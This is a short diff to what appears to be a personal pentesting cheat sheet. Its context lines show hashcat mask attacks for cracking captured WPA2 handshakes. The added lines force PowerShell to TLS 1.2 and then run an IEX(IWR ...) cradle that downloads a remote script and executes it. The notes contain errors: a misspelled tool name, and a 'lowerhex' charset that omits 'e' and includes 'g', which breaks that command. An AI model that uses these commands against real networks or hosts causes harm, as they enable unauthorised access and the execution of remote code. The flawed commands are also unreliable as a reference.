@@ -212,3 +212,8 @@ hashcap -m 2500 -a 3 wpa2psk.hccapx "?l?l?l?l?l?l?l?l"
 echo 0123456789abcdfg > lowerhex.hcchr
 hashcat -m 2500 -a 3 wpa2psk.hccapx -1 lowerhex.hcchr "?1?1?1?1?1?1?1?1"
 ------------------------------------------------------------------------------------
+
+Powershell use TLS 1.0 to connect to the website, if the website didn't allow TSL1.0 we need to force Powershell to connect the support version of TLS
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+Then we can use IEX(IWR -UseBasicParsing -Uri https:///.ps1)
